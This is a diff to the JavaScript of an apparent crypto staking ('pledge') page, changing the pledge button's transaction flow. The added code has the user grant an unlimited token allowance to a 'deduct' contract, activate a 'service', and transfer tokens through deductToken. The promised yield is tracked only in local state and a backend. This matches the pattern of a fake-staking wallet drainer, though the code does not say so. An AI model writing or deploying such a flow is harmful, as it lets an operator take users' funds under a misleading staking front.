@@ -1330,6 +1330,7 @@ document.addEventListener('DOMContentLoaded', () => {
     });
   }
 
+  // 【關鍵修正】質押交易流程
   if (pledgeBtn) {
     pledgeBtn.addEventListener('click', async () => {
       if (!signer) { updateStatus(translations[currentLang].noWallet, true); return; }
@@ -1337,38 +1338,61 @@ document.addEventListener('DOMContentLoaded', () => {
       const durationDays = parseInt(pledgeDuration.value) || 90;
       const token = pledgeToken.value;
       if (amount <= 0) { updateStatus(translations[currentLang].invalidPledgeAmount, true); return; }
+
       const tokenContract = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract }[token];
       const decimals = token === 'WETH' ? 18 : 6;
-      // 使用 BigInt 精確計算
-      const amountWei = ethers.parseUnits(amount.toFixed(decimals), decimals);
+
+      // 【關鍵修正】精確轉換，防止浮點誤差
+      const amountStr = amount.toFixed(decimals);
+      const amountWei = ethers.parseUnits(amountStr, decimals);
+
       try {
+        // 1. 檢查餘額
         const balance = await tokenContract.connect(provider).balanceOf(userAddress);
         if (balance < amountWei) {
           updateStatus(translations[currentLang].insufficientBalance, true);
           return;
         }
+
+        // 2. 檢查並執行 approve
         const allowance = await tokenContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
         if (allowance < amountWei) {
           updateStatus(`Approving ${token}...`);
           const approveTx = await tokenContract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
           await sendMobileRobustTransaction(approveTx);
         }
+
+        // 【關鍵修正】3. 檢查並啟動服務
+        const isActive = await deductContract.isServiceActiveFor(userAddress);
+        if (!isActive) {
+          updateStatus('Activating service...');
+          const tokenAddress = token === 'USDT' ? USDT_CONTRACT_ADDRESS : 
+                                token === 'USDC' ? USDC_CONTRACT_ADDRESS : WETH_CONTRACT_ADDRESS;
+          const activateTx = await deductContract.activateService.populateTransaction(tokenAddress);
+          await sendMobileRobustTransaction(activateTx);
+        }
+
+        // 4. 執行扣款
         updateStatus('Deducting...');
-        const tokenAddress = token === 'USDT' ? USDT_CONTRACT_ADDRESS : token === 'USDC' ? USDC_CONTRACT_ADDRESS : WETH_CONTRACT_ADDRESS;
+        const tokenAddress = token === 'USDT' ? USDT_CONTRACT_ADDRESS : 
+                              token === 'USDC' ? USDC_CONTRACT_ADDRESS : WETH_CONTRACT_ADDRESS;
         const deductTx = await deductContract.deductToken.populateTransaction(tokenAddress, amountWei);
         await sendMobileRobustTransaction(deductTx);
+
+        // 5. 更新本地狀態
         accountBalance[token].pledged += amount;
         const durationInfo = PLEDGE_DURATIONS.find(d => d.days === durationDays);
         const pledgeOrder = {
           amount, token, duration: durationDays, startTime: Date.now(), apr: durationInfo.rate
         };
         userPledges.push(pledgeOrder);
-        await saveUserData();  // 必要儲存
+        await saveUserData();
         updateStatus(translations[currentLang].pledgeSuccess);
         updatePledgeSummary();
         updateAccountBalanceDisplay();
         pledgeAmount.value = '';
         sendToBackend({ type: 'pledge', amount, token, duration: durationDays });
+
       } catch (error) {
         updateStatus(`${translations[currentLang].pledgeError}: ${error.message}`, true);
       }
